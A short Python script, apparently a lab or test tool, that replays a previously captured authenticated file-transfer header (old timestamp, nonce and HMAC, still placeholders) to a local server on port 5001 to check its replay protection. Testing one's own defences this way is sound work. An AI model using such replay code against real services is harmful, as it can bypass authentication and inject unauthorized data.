import socket

REPLAY_DATA = {
    "filename": "Fingerprint_PNG_Clipart.png",
    "filesize": 31257,
    "filehash": "REPLACE_WITH_ACTUAL_HASH",
    "timestamp": "REPLACE_WITH_OLD_TIMESTAMP",
    "nonce": "REPLACE_WITH_OLD_NONCE",
    "hmac": "REPLACE_WITH_OLD_HMAC"
}

SERVER_HOST = '127.0.0.1'
SERVER_PORT = 5001
BUFFER_SIZE = 4096

def send_replay(filename):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((SERVER_HOST, SERVER_PORT))
        print(f"[!] Connected to {SERVER_HOST}:{SERVER_PORT} for replay attack")

        header = f"{REPLAY_DATA['filename']}|{REPLAY_DATA['filesize']}|{REPLAY_DATA['filehash']}|{REPLAY_DATA['timestamp']}|{REPLAY_DATA['nonce']}|{REPLAY_DATA['hmac']}"
        s.send(header.encode())

        response = s.recv(BUFFER_SIZE).decode()
        if response != "READY":
            print("[-] Replay rejected by server.")
            return

        with open(filename, "rb") as f:
            while chunk := f.read(BUFFER_SIZE):
                s.sendall(chunk)

        print("[!] Replay attack sent")

if __name__ == '__main__':
    send_replay(REPLAY_DATA["filename"])